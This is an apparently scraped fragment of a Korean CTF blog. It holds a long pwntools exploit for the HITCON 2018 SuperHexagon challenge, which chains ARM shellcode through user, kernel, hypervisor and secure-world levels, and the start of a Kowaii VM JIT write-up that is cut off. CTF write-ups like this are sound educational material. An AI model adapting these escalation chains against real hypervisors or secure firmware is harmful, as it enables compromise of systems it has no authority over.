~TLB_FORCE_SLOW); flags |= full-\u0026gt;slow_flags[access_type]; data-\u0026gt;full = full; data-\u0026gt;flags = flags; /* Compute haddr speculatively; depending on flags it might be invalid. */ data-\u0026gt;haddr = (void *)((uintptr_t)addr + entry-\u0026gt;addend); return maybe_resized; } 다음과 같이 hit이면 그냥 저장된 인덱스에 맞춰서 바로 리턴하는 것을 확인할 수 있다. 쉘 코드 길이를 늘리기 위해선 그냥 여기서 fault 내고 더 낮은 exception vector offset으로 뛰면 0xd00 주변으로 뛸 수 있다. 그걸 이용해서 0xd00 주변에 쉘 코드를 배치한다. Exploit code (code execution \u0026amp; flag) from pwn import * from keystone import * sla = lambda x,y : p.sendlineafter(x,y) sa = lambda x,y : p.sendafter(x,y) context.binary = e = ELF(\u0026#39;./super_hexagon/share/_bios.bin.extracted/BC010\u0026#39;) ks = Ks(KS_ARCH_ARM64,KS_MODE_LITTLE_ENDIAN) sc_st = 0x7ffeffffd006 shellcode = b\u0026#39;\u0026#39; shellcode += bytes(ks.asm(f\u0026#39;\u0026#39;\u0026#39;\\ mov x5, #-1 mov w4, #0x0 mov w3, #0x0 mov w2, #3 mov x1, #0x1000 mov x0, #0x0 mov x8, #0xde svc #0x1337 mov x11, x0 mov w9, #0x0 loop: add x1, x11, x9 mov x8, #0x3f mov x0, #0 mov x2, #0x1 svc #0x1337 add w9, w9, #1 cmp x9, #0x1000 bne loop mov x0, x11 mov x1, #0x1000 mov x2, #5 mov x8, #0xe2 svc #0x1337 blr x11 \u0026#39;\u0026#39;\u0026#39;)[0]) assert b\u0026#39;\\r\u0026#39; not in shellcode and b\u0026#39;\\x0a\u0026#39; not in shellcode # p = remote(\u0026#39;localhost\u0026#39;,6666) p = process(\u0026#39;./local_debug.sh\u0026#39;) # p = process(\u0026#39;./local_debug_secure.sh\u0026#39;) payload = b\u0026#39;A\u0026#39; * 0x100 payload += p64(0xdeadbeef) payload += p64(e.sym.gets) # cmd = 1 sla(b\u0026#39;cmd\u0026gt; \u0026#39;, b\u0026#39;1\u0026#39;) sla(b\u0026#39;index: \u0026#39;, str(0)) sla(b\u0026#39;key: \u0026#39;, payload) sleep(0.1) payload = b\u0026#39;A\u0026#39; * 0b101 + b\u0026#39;\\x00\u0026#39; payload += shellcode p.sendline(payload) sla(b\u0026#39;cmd\u0026gt; \u0026#39;, b\u0026#39;1\u0026#39;) sla(b\u0026#39;index: \u0026#39;, str(0x1000)) payload = b\u0026#39;\u0026#39; payload += b\u0026#39;A\u0026#39;*0b101 + b\u0026#39;\\x00\u0026#39; payload += b\u0026#39;A\u0026#39;*(0x100 - len(payload)) payload += p64(0xdeadbeef) payload += p64(e.sym.mprotect) payload += p64(sc_st) sla(b\u0026#39;key: \u0026#39;, payload) sla(b\u0026#39;cmd\u0026gt; \u0026#39;,b\u0026#39;2\u0026#39;) sla(b\u0026#39;index: \u0026#39;, str(1)) sleep(0.1) read_flag = [1, 252, 59, 213, 1, 0, 0, 185, 33, 252, 59, 213, 1, 4, 0, 185, 65, 252, 59, 213, 1, 8, 0, 185, 97, 252, 59, 213, 1, 12, 0, 185, 129, 252, 59, 213, 1, 16, 0, 185, 161, 252, 59, 213, 1, 20, 0, 185, 193, 252, 59, 213, 1, 24, 0, 185, 225, 252, 59, 213, 1, 28, 0, 185] SEL3_shellcode = asm(\u0026#39;\u0026#39;\u0026#39;\\ mov x0, sp \u0026#39;\u0026#39;\u0026#39;) SEL3_shellcode += bytes(read_flag) SEL3_shellcode += asm(\u0026#39;\u0026#39;\u0026#39;\\ ldr x11, =0x09000000 mov x8, #0 loop_print_flag_sel3: add x1, sp, x8 // dst ldrb w0, [x1] strb w0, [x11] add x8, x8, #1 cmp x8, #32 bne loop_print_flag_sel3 \u0026#39;\u0026#39;\u0026#39;) # 0x000000000e002210 00000fb0 WORLD_SHARED_MEM_VA = 0x023fe000 WORLD_SHARED_MEM_PA = 0x40033000 SEL1_shellcode = b\u0026#39;\u0026#39; SEL1_shellcode += asm(f\u0026#39;\u0026#39;\u0026#39;\\ ldr r0, ={WORLD_SHARED_MEM_VA} add r10, r0, #0x20c mov r9, #0 ldr r2, =0x100de8 // 0xe499000 + 0xde8 loop: add r0, r10, r9 add r1, r2, r9 ldrb r0, [r0] strb r0, [r1] add r9, r9, #1 cmp r9, #{len(SEL3_shellcode)} bne loop // mapping ldr r0, =0x8005008 ldr r1, =0xe00364f str r1, [r0] mov r0, #0x1000 ldr r1, =0xe499783 str r1, [r0] // ctx ldr r0, =0x8005008 ldr r1, =0xe00264f str r1, [r0] // tlb is already cached by the softmmu mcr p15, 0, r0, c8, c7, 0 dsb sy isb mov r0, #0x1328 ldr r1, =0x800002cc str r1, [r0] mov r0, #0x1330 mov r1, #0 str r1, [r0] \u0026#39;\u0026#39;\u0026#39;,arch=\u0026#39;arm\u0026#39;) # dummy code is added. # SEL1_shellcode += b\u0026#39;\\xfe\\xff\\xff\\xea\u0026#39; # loop for debugging SEL1_shellcode += asm(\u0026#39;\u0026#39;\u0026#39;\\ mov r0, 0x8300 lsl r0, r0, #16 orr r0, r0, #0x7 \u0026#39;\u0026#39;\u0026#39;,arch=\u0026#39;arm\u0026#39;) # separation needed. SEL1_shellcode += bytes.fromhex(\u0026#39;70 00 60 e1\u0026#39;) TCI_Data_addr = 0x4010225c SEL0_shellcode = b\u0026#34;\\x00\\xf0\\x08\\xe8\u0026#34; # thumb switch SEL0_shellcode += b\u0026#39;A\u0026#39;*0x10 SEL0_shellcode += asm(f\u0026#39;\u0026#39;\u0026#39;\\ mov r10, #{((WORLD_SHARED_MEM_VA)\u0026gt;\u0026gt;16)\u0026amp;0xffff} lsl r10, r10, #16 orr r10, r10, #{(WORLD_SHARED_MEM_VA)\u0026amp;0xffff} add r10, r10, #0x10c mov r0, #0xb mov r1, r10 svc 0x1 svc 0x0 // return to normal world \u0026#39;\u0026#39;\u0026#39;,arch=\u0026#39;arm\u0026#39;) SEL0_shellcode += b\u0026#39;A\u0026#39; * (0x100 - len(SEL0_shellcode)) SEL0_shellcode += SEL1_shellcode assert len(SEL0_shellcode) \u0026lt;= 0x200 SEL0_shellcode += b\u0026#39;A\u0026#39; * (0x200 - len(SEL0_shellcode)) SEL0_shellcode += SEL3_shellcode SEL0_shellcode_src = 0x40035500 UART= 0x0000000009000000 TCI_Data = b\u0026#39;\u0026#39; TCI_Data += p32(0xdeadbeef) * 8 + p32(0xdeadbeef) * 2 TCI_Data += p32(0) + p32(0x31) + p32(0x00000000e4990b0-8) + p32(0x0) + p32(0) + p32(0) + b\u0026#39;A\u0026#39; * 0x18# chunk 1 TCI_Data += p32(0) + p32(0x31) + p32(0x1670+8-0x10) + p32(0x0100060-0x8) + b\u0026#39;B\u0026#39; * 0x14 # chunk 2 EL2_shellcode = asm(f\u0026#39;\u0026#39;\u0026#39;\\ movz x11, #{((UART)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x11, #{((UART)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x11, #{((UART)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x11, #{(UART)\u0026amp;0xffff}, lsl #0 mov x0, sp \u0026#39;\u0026#39;\u0026#39;) + bytes(read_flag) + asm(f\u0026#39;\u0026#39;\u0026#39;\\ mov x9, #0 loop: add x0, sp, x9 ldrb w0, [x0] strb w0, [x11] add x9, x9, #1 cmp x9, #32 bne loop movk x10, #{((WORLD_SHARED_MEM_VA)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x10, #{(WORLD_SHARED_MEM_VA)\u0026amp;0xffff}, lsl #0 movz x9, #{((WORLD_SHARED_MEM_PA)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x9, #{((WORLD_SHARED_MEM_PA)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x9, #{((WORLD_SHARED_MEM_PA)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x9, #{(WORLD_SHARED_MEM_PA)\u0026amp;0xffff}, lsl #0 movz x20, #{((SEL0_shellcode_src)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x20, #{((SEL0_shellcode_src)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x20, #{((SEL0_shellcode_src)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x20, #{(SEL0_shellcode_src)\u0026amp;0xffff}, lsl #0 add x21, x9, #0xc // shellcode_dst, TCI buf payload mov x25, #0 alloc_loop: // alloc(i, 0x20, b\u0026#39;\u0026#39;) mov w2, #3 str w2, [x9] // cmd mov w2, w25 str w2, [x9, #4] // idx movz w2, #0x0000, lsl 16 movk w2, #0x20, lsl 0 str w2, [x9, #8] // sz movz x0, #0x8300, lsl 16 movk x0, #0x06, lsl 0 mov x1, x10 smc #0x1337 add x25, x25, #1 cmp x25, #{3} bne alloc_loop mov x25, #2 free_loop: // free 2, 1, 0 mov w2, #3 str w2, [x9] // cmd mov w2, w25 str w2, [x9, #4] // idx movz w2, #0x0000, lsl 16 movk w2, #0x40, lsl 0 str w2, [x9, #8] // sz movz x0, #0x8300, lsl 16 movk x0, #0x06, lsl 0 mov x1, x10 smc #0x1337 cmp x25, #{0} sub x25, x25, #1 bne free_loop //trigger the vuln mov w2, #3 str w2, [x9] // cmd mov w2, #0 str w2, [x9, #4] // idx movz w2, #0xffff, lsl 16 movk w2, #0xffff, lsl 0 str w2, [x9, #8] // sz movz x22, #{((TCI_Data_addr)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x22, #{((TCI_Data_addr)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x22, #{((TCI_Data_addr)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x22, #{(TCI_Data_addr)\u0026amp;0xffff}, lsl #0 mov x8, #0x0 loop_tci: add x2, x21, x8 // dst add x1, x22, x8 // src ldrb w0, [x1] strb w0, [x2] add x8, x8, #1 cmp x8, #{len(TCI_Data)} bne loop_tci movz x0, #0x8300, lsl 16 movk x0, #0x06, lsl 0 mov x1, x10 smc #0x1337 // unlink AAW trigger mov w2, #3 str w2, [x9] // cmd mov w2, #4 str w2, [x9, #4] // idx movz w2, #0x0000, lsl 16 movk w2, #0x20, lsl 0 str w2, [x9, #8] // sz movz w2, 0x0010, lsl #16 movk w2, 0x0050, lsl #0 str w2, [x9, #16] // data + 4 str w2, [x9, #20] // this is needed to get out of the freelist loop. movz x0, #0x8300, lsl 16 movk x0, #0x06, lsl 0 mov x1, x10 smc #0x1337 // get .text mov w2, #3 str w2, [x9] // cmd mov w2, #5 str w2, [x9, #4] // idx movz w2, #0x0000, lsl 16 movk w2, #0x1900, lsl 0 str w2, [x9, #8] // sz mov x8, #0x0 loop_copy: add x2, x21, x8 add x1, x20, x8 ldrb w0, [x1] strb w0, [x2] add x8, x8, #1 cmp x8, #{len(SEL0_shellcode)} bne loop_copy movz x0, #0x8300, lsl 16 movk x0, #0x06, lsl 0 mov x1, x10 smc #0x1337 movz x0, #0x8300, lsl 16 movk x0, #0x05, lsl 0 ldr x1, =0x2000000 mov x2, #0x100 smc #0x1337 mov x8, #0x0 \u0026#39;\u0026#39;\u0026#39;) EL2_shellcode += b\u0026#39;A\u0026#39; * (0x250- len(EL2_shellcode)) + TCI_Data EL2_shellcode = b\u0026#39;\\x41\u0026#39;*0xc+EL2_shellcode entry = 0xffffffffc001e000 + 0xf0 addr = 0xffffffffc00091b8 IPA = 0x2400 | (0b11\u0026lt;\u0026lt;6) # s2ap 11 DESC = 3 | 0x100000 EL2_TEXT = 0x00007ffeffffa000 entry_user = 0xffffffffc0028000 + 0xfd0 user_val = 0x2403 | 64 | 0x0020000000000000# ap 01 EL2_shellcode_addr = 0x7ffeffffc100 EL1_shellcode = asm(f\u0026#39;nop\u0026#39;)*(0x400//4) EL1_shellcode += asm(f\u0026#39;\u0026#39;\u0026#39;\\ mov x0, #1 movz x1, #{((IPA)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x1, #{((IPA)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x1, #{((IPA)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x1, #{(IPA)\u0026amp;0xffff}, lsl #0 movz x2, #{((DESC)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x2, #{((DESC)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x2, #{((DESC)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x2, #{(DESC)\u0026amp;0xffff}, lsl #0 hvc #0x1337 // PA 0x0000000040102000 RWX movz x11, #{((entry_user)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x11, #{((entry_user)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x11, #{((entry_user)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x11, #{(entry_user)\u0026amp;0xffff}, lsl #0 movz x10, #{((user_val)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x10, #{((user_val)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x10, #{((user_val)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x10, #{(user_val)\u0026amp;0xffff}, lsl #0 str x10, [x11] // IPA 0x0000000000002000 RW movz x11, #{((EL2_TEXT)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x11, #{((EL2_TEXT)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x11, #{((EL2_TEXT)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x11, #{(EL2_TEXT)\u0026amp;0xffff}, lsl #0 movz x12, #{((EL2_shellcode_addr)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x12, #{((EL2_shellcode_addr)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x12, #{((EL2_shellcode_addr)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x12, #{(EL2_shellcode_addr)\u0026amp;0xffff}, lsl #0 mov x9, #0x0 loop: add x2, x11, x9 add x1, x12, x9 ldrb w0, [x1] strb w0, [x2] add w9, w9, #1 cmp x9, #{len(EL2_shellcode)} bne loop hvc #0x1337 // trigger!!! \u0026#39;\u0026#39;\u0026#39;) cnt = len(EL1_shellcode) val = 0x0040000000036483 shellcode = f\u0026#39;\u0026#39;\u0026#39;\\ mov x5, #-1 mov w4, #0x0 mov w3, #0x0 mov w2, #3 mov x1, #0x1000 mov x0, #0x0 mov x8, #0xde svc #0x1337 mov x11, x0 // IPA 0x36000 mov x9, #0x0 loop: add x1, x11, x9 mov x8, #0x3f mov x0, #0 mov x2, #0x1 svc #0x1337 add w9, w9, #1 cmp x9, #{cnt} bne loop mov x0, x11 mov x1, #0x1000 mov x2, #5 // r-x mov x8, #0xe2 svc #0x1337 mov x5, #-1 mov w4, #0x0 mov w3, #0x0 mov w2, #3 mov x1, #0x1000 mov x0, #0x0 mov x8, #0xde svc #0x1337 // IPA 0x37000 movz x11, #{((entry)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x11, #{((entry)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x11, #{((entry)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x11, #{(entry)\u0026amp;0xffff}, lsl #0 mov x0, #0 mov x1, x11 mov x8, #0x3f mov x2, #1 svc #0x1337 // now we can modify the kernel page table movz x10, #{((val)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x10, #{((val)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x10, #{((val)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x10, #{(val)\u0026amp;0xffff}, lsl #0 sub x11, x11, #0xa0 str x10, [x11] mov x8, #0x123 svc #0x1337 \u0026#39;\u0026#39;\u0026#39; payload = bytes(ks.asm(shellcode)[0]) payload += b\u0026#39;\\x41\u0026#39; * (0x100 - len(payload)) payload += EL2_shellcode assert len(payload) \u0026lt;= 0x500 payload += b\u0026#39;\\x41\u0026#39; * (0x500 - len(payload)) payload += SEL0_shellcode payload += b\u0026#39;\\x41\u0026#39; * (0x1000 - len(payload)) p.send(payload) sleep(0.1) p.send(EL1_shellcode) sleep(0.1) p.send(b\u0026#39;\\x43\u0026#39;) # AP 01 -\u0026gt; EL0 RW EL1 RW sleep(0.1) p.interactive() ","permalink":"https://msh1307.kr/blog/hitcon_2018_superhexagon/","summary":"오랜만에 한꺼번에 블로그 글을 쓰게 되었다. 이번년도 초에 Theori에서 과제로 superhexagon을 풀면서 관련 CS를 한달간 공부해오는 것을 과제로 받았다. 글에서 언급하는 background 내용은 다른 글에서 따로 정리되어있다.\nOverview diff -Naur \u0026#39;--exclude=tests\u0026#39; \u0026#39;--exclude=roms\u0026#39; \u0026#39;--exclude=capstone\u0026#39; \u0026#39;--exclude=docs\u0026#39; ../temp/qemu-3.0.0/hw/arm/hitcon.c qemu/hw/arm/hitcon.c --- ../temp/qemu-3.0.0/hw/arm/hitcon.c\t1969-12-31 16:00:00.000000000 -0800 +++ qemu/hw/arm/hitcon.c\t2018-10-19 10:49:59.412023642 -0700 @@ -0,0 +1,208 @@ +#include \u0026#34;qemu/osdep.h\u0026#34; +#include \u0026#34;qapi/error.h\u0026#34; +#include \u0026#34;qemu-common.h\u0026#34; +#include \u0026#34;cpu.h\u0026#34; +#include \u0026#34;hw/sysbus.h\u0026#34; +#include \u0026#34;hw/devices.h\u0026#34; +#include \u0026#34;hw/boards.h\u0026#34; +#include \u0026#34;hw/arm/arm.h\u0026#34; +#include \u0026#34;hw/misc/arm_integrator_debug.h\u0026#34; +#include \u0026#34;net/net.h\u0026#34; +#include \u0026#34;exec/address-spaces.","title":"HITCON CTF 2018 - SuperHexagon"},{"content":"Kowaii VM Analysis 문제에서 소스코드를 제공해준다.\n---- 0x0000 Header data ---- 0x1000 .CODE ---- bss \u0026gt;= 0xc000 .BSS ---- 0xffff 위와 같은 바이너리 구조를 입력으로 받는다.\nclass kowaiiCtx { private: void *genAddr() { u64 r = 0; do r = (u64)rand(); while((int)r \u0026lt; 0); return (void *)(r \u0026lt;\u0026lt; 12); } public: kowaiiBin *bin; kowaiiRegisters *regs; kowaiiFuncEntry **callStack; kowaiiFuncEntry **callStackBase; u8 *bss; u8 *jitBase; u8 *jitEnd; kowaiiCtx() { this-\u0026gt;bin = (kowaiiBin *)mmap(this-\u0026gt;genAddr(), MAX_BIN_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0); this-\u0026gt;regs = (kowaiiRegisters *)calloc(1,sizeof(kowaiiRegisters)); if(this-\u0026gt;bin == (void *)-1 || this-\u0026gt;regs == NULL) error(\u0026#34;Memory error!\u0026#34;); } void readBin() { u8 *ptr = (u8 *)this-\u0026gt;bin; u8 chr = 0xa; u8 eof = 0x0; u32 i = 0; cout \u0026lt;\u0026lt; \u0026#34;Send your kowaii binary\u0026#34; \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;\u0026gt; \u0026#34; \u0026lt;\u0026lt; flush; while(i \u0026lt; MAX_BIN_SIZE) { if(read(0,\u0026amp;chr,1) \u0026lt; 0) error(\u0026#34;Read error!\u0026#34;); if(chr == 0xa) { if(eof) { ptr[i-1] = 0x0; break; } ptr[i++] = chr; eof = 1; } else { ptr[i++] = chr; eof = 0; } } } void checkBin() { if(memcmp(this-\u0026gt;bin-\u0026gt;kowaii,\u0026#34;KOWAII\u0026#34;,6)) error(\u0026#34;Invalid file format!\u0026#34;); if(this-\u0026gt;bin-\u0026gt;entry \u0026lt; CODE_START_ADDR || this-\u0026gt;bin-\u0026gt;entry \u0026gt; this-\u0026gt;bin-\u0026gt;bss) error(\u0026#34;Invalid entry point!\u0026#34;); if(this-\u0026gt;bin-\u0026gt;magic != 0xdeadc0de) error(\u0026#34;Corrupted file!\u0026#34;); if(this-\u0026gt;bin-\u0026gt;bss \u0026lt; MAX_BIN_SIZE-BSS_SIZE) error(\u0026#34;Invalid .bss!\u0026#34;); if(this-\u0026gt;bin-\u0026gt;no_funcs \u0026gt; MAX_FUNC_ENTRIES) error(\u0026#34;Invalid function table!\u0026#34;); } void prepareFuncTable() { for(int i = 0; i \u0026lt; this-\u0026gt;bin-\u0026gt;no_funcs; i++) { u64 addr = (u64)(this-\u0026gt;bin-\u0026gt;funct[i].addr); if(addr \u0026gt; this-\u0026gt;bin-\u0026gt;bss || addr \u0026lt; CODE_START_ADDR) error(\u0026#34;Invalid function table!\u0026#34;); this-\u0026gt;bin-\u0026gt;funct[i].addr = (u64)(this-\u0026gt;bin)+addr; this-\u0026gt;bin-\u0026gt;funct[i].callCount = 0; } } void prepareCtx() { this-\u0026gt;prepareFuncTable(); this-\u0026gt;regs-\u0026gt;bp = (u64 *)mmap(this-\u0026gt;genAddr(), STACK_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0); if(this-\u0026gt;regs-\u0026gt;bp == (void *)(-1)) error(\u0026#34;Unable to map stack!\u0026#34;); this-\u0026gt;regs-\u0026gt;bp += (STACK_SIZE)/sizeof(u64); this-\u0026gt;regs-\u0026gt;sp = this-\u0026gt;regs-\u0026gt;bp; this-\u0026gt;jitBase = (u8 *)mmap(this-\u0026gt;genAddr(), JIT_SIZE, PROT_READ | PROT_EXEC, MAP_PRIVATE | MAP_ANON, -1, 0); if(this-\u0026gt;jitBase == (void *)(-1)) error(\u0026#34;Unable to allocate executable memory!\u0026#34;); this-\u0026gt;jitEnd = this-\u0026gt;jitBase + JIT_SIZE; this-\u0026gt;callStackBase = (kowaiiFuncEntry **)mmap(this-\u0026gt;genAddr(), STACK_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0); if(this-\u0026gt;callStackBase == (void *)(-1)) error(\u0026#34;Unable to map call stack!\u0026#34;); this-\u0026gt;callStack = this-\u0026gt;callStackBase; this-\u0026gt;regs-\u0026gt;pc = (u8 *)(this-\u0026gt;bin)+this-\u0026gt;bin-\u0026gt;entry; this-\u0026gt;bss = ((u8 *)(this-\u0026gt;bin)+this-\u0026gt;bin-\u0026gt;bss); mprotect((void *)((u64)this-\u0026gt;bin+CODE_START_ADDR), this-\u0026gt;bin-\u0026gt;bss-CODE_START_ADDR, PROT_READ); } }; 커스텀 바이너리를 입력으로 받는다. text, bss 영역이 존재한다. vm context를 세팅하는 함수가 있는데 stack, jit page, callStack 모두 주소가 랜덤화된다.\nvoid virtual callFunc() { u16 hash = *(u16 *)(this-\u0026gt;ctx.regs-\u0026gt;pc+1); kowaiiFuncEntry *fe = NULL; for(int i = 0; i \u0026lt; this-\u0026gt;ctx.bin-\u0026gt;no_funcs; i++) { if(hash == this-\u0026gt;ctx.bin-\u0026gt;funct[i].hash) { fe = \u0026amp;this-\u0026gt;ctx.bin-\u0026gt;funct[i]; break; } } if(!fe) error(\u0026#34;Invalid function call!\u0026#34;); *(--this-\u0026gt;ctx.regs-\u0026gt;sp) = (u64)(this-\u0026gt;ctx.regs-\u0026gt;pc+3); this-\u0026gt;ctx.regs-\u0026gt;pc = (u8 *)fe-\u0026gt;addr; *(++this-\u0026gt;ctx.callStack) = fe; return; } void virtual retFunc() { this-\u0026gt;ctx.regs-\u0026gt;pc = (u8 *)(*this-\u0026gt;ctx.regs-\u0026gt;sp++); *(this-\u0026gt;ctx.callStack--) = NULL; return; } void checkState() { switch(*this-\u0026gt;ctx.regs-\u0026gt;pc) { case ADD: case SUB: case MUL: this-\u0026gt;dst = *(this-\u0026gt;ctx.regs-\u0026gt;pc+1); this-\u0026gt;src1 = *(this-\u0026gt;ctx.regs-\u0026gt;pc+2); this-\u0026gt;src2 = *(this-\u0026gt;ctx.regs-\u0026gt;pc+3); if(this-\u0026gt;dst \u0026gt;= MAX_REGS || this-\u0026gt;src1 \u0026gt;= MAX_REGS | this-\u0026gt;src2 \u0026gt;= MAX_REGS) error(\u0026#34;Invalid register!\u0026#34;); this-\u0026gt;stepSize = 4; break; case SHR: case SHL: this-\u0026gt;dst = *(this-\u0026gt;ctx.regs-\u0026gt;pc+1); this-\u0026gt;imm = *(this-\u0026gt;ctx.regs-\u0026gt;pc+2); if(this-\u0026gt;dst \u0026gt;= MAX_REGS) error(\u0026#34;Invalid register!\u0026#34;); this-\u0026gt;stepSize = 3; break; case PUSH: this-\u0026gt;src1 = *(this-\u0026gt;ctx.regs-\u0026gt;pc+1); if(this-\u0026gt;src1 \u0026gt;= MAX_REGS) error(\u0026#34;Invalid register!\u0026#34;); if((u64)(this-\u0026gt;ctx.regs-\u0026gt;bp - this-\u0026gt;ctx.regs-\u0026gt;sp) \u0026gt;= STACK_SIZE) error(\u0026#34;Stack Overflow (┛ಠ_ಠ)┛彡┻━┻\u0026#34;); this-\u0026gt;stepSize = 2; break; case POP: this-\u0026gt;dst = *(this-\u0026gt;ctx.regs-\u0026gt;pc+1); if(this-\u0026gt;dst \u0026gt;= MAX_REGS) error(\u0026#34;Invalid register!\u0026#34;); if(this-\u0026gt;ctx.regs-\u0026gt;bp \u0026lt;= this-\u0026gt;ctx.regs-\u0026gt;sp) error(\u0026#34;Stack Underflow ┳━┳ ヽ(ಠل͜ಠ)ﾉ\u0026#34;); this-\u0026gt;stepSize = 2; break; case GET: case SET: this-\u0026gt;src1 = *(this-\u0026gt;ctx.regs-\u0026gt;pc+1); if(this-\u0026gt;src1 \u0026gt;= MAX_REGS) error(\u0026#34;Invalid register!\u0026#34;); this-\u0026gt;imm = *(u32 *)(this-\u0026gt;ctx.regs-\u0026gt;pc+2); if(this-\u0026gt;imm \u0026gt;= (((u64)this-\u0026gt;ctx.bin+MAX_BIN_SIZE)-(u64)this-\u0026gt;ctx.bss)) error(\u0026#34;Out Of Bounds on .bss ヽ(°ロ°)ﾉ\u0026#34;); this-\u0026gt;stepSize = 6; break; vm은 checkState에서 검증을 모두 수행하고 취약점이 발생하지 않는다. 그리고 JIT compile이 활성화되었는지 아닌지에 따라서 callFunc, retFunc가 오버라이딩된다.\nvoid virtual callFunc() { u16 hash = *(u16 *)(this-\u0026gt;ctx.regs-\u0026gt;pc+1); kowaiiFuncEntry *fe = NULL; for(int i = 0; i \u0026lt; this-\u0026gt;ctx.bin-\u0026gt;no_funcs; i++) { if(hash == this-\u0026gt;ctx.bin-\u0026gt;funct[i].hash) { fe = \u0026amp;this-\u0026gt;ctx.bin-\u0026gt;funct[i]; break; } } if(!fe) error(\u0026#34;Invalid function call!\u0026#34;); if(fe-\u0026gt;callCount \u0026gt;= JIT_CC \u0026amp;\u0026amp; fe-\u0026gt;size \u0026gt;= JIT_MS) { this-\u0026gt;jitCall(fe); this-\u0026gt;ctx.regs-\u0026gt;pc += 3; return; } *(--this-\u0026gt;ctx.regs-\u0026gt;sp) = (u64)(this-\u0026gt;ctx.regs-\u0026gt;pc+3); this-\u0026gt;ctx.regs-\u0026gt;pc = (u8 *)fe-\u0026gt;addr; *(++this-\u0026gt;ctx.callStack) = fe; return; } void virtual retFunc() { this-\u0026gt;ctx.regs-\u0026gt;pc = (u8 *)(*this-\u0026gt;ctx.regs-\u0026gt;sp++); (*this-\u0026gt;ctx.callStack)-\u0026gt;callCount++; if((*this-\u0026gt;ctx.callStack)-\u0026gt;callCount \u0026gt;= JIT_CC \u0026amp;\u0026amp; (*this-\u0026gt;ctx.callStack)-\u0026gt;size \u0026gt;= JIT_MS ) this-\u0026gt;jitGen(*this-\u0026gt;ctx.callStack); *(this-\u0026gt;ctx.callStack--) = NULL; return; } JIT이 활성화된 클래스를 확인해보면 retFunc에서 callStack을 빼면서 callCount를 수집한다. 또한 CallCount를 JIT_CC와 비교해서 네이티브로 컴파일해 최적화를 수행한다. 이미 앞서 vm에서 충분히 검증되었다고 믿고, JIT에선 검증없이 컴파일한다.\nvoid jitEmitIns(u64 INS, u16 reg1, u16 reg2, u16 reg3) { u8 insSize = 0; if(INS \u0026lt; (1\u0026lt;\u0026lt;8)) insSize = 0x1; else if(INS \u0026lt; (1\u0026lt;\u0026lt;16)) insSize = 0x2; else if(INS \u0026lt; (1\u0026lt;\u0026lt;24)) insSize = 0x3; else insSize = 0x4; *(u64 *)(this-\u0026gt;ctx.jitBase) = INS; if(reg1 != x64_NOREG) { if(reg1 \u0026lt; MAX_REGS) reg1 = x64_REG+reg1; else reg1 = reg1 \u0026amp; 0x3; *(this-\u0026gt;ctx.jitBase+insSize-1) += reg1; } if(reg2 != x64_NOREG) { if(reg2 \u0026lt; MAX_REGS) reg2 = x64_REG+reg2; else reg2 = reg2 \u0026amp; 0x3; *(this-\u0026gt;ctx.jitBase+insSize-1) += reg2 \u0026lt;\u0026lt; 3; } if(reg3 != x64_NOREG) { if(reg3 \u0026lt; MAX_REGS) reg3 = x64_REG+reg3; else reg3 = reg3 \u0026amp; 0x3; *(this-\u0026gt;ctx.jitBase+insSize-2) += reg3 \u0026lt;\u0026lt; 3; } this-\u0026gt;ctx.jitBase += insSize; } void jitGen(kowaiiFuncEntry *fe) { u8 *code = (u8 *)fe-\u0026gt;addr; u8 reg1, reg2, reg3; u64 imm; int i = 0; u16 hash; kowaiiFuncEntry *kfe; vector\u0026lt;char\u0026gt; stackBalance; mprotect(this-\u0026gt;ctx.jitEnd-JIT_SIZE, JIT_SIZE, PROT_READ | PROT_WRITE); fe-\u0026gt;addr = (u64)this-\u0026gt;ctx.jitBase; while(i \u0026lt; 